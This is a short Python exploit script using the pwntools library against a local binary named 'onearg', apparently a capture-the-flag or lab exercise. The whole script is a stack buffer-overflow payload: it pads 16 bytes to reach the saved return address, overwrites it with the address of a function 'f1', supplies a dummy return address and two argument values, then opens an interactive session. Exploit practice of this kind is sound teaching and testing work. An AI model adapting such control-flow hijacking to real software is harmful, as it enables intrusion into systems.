from pwn import *

p = process("./onearg")

EGG = "A"*16 # Offset to return address

EGG += p32(0x080484b6) # Add address for f1
EGG += p32(0x41414141) # Return address for f1... We don't need to ret yet
EGG += p32(0xdeadbeef)
EGG += p32(0xcafebabe)

p.sendline(EGG)

p.interactive()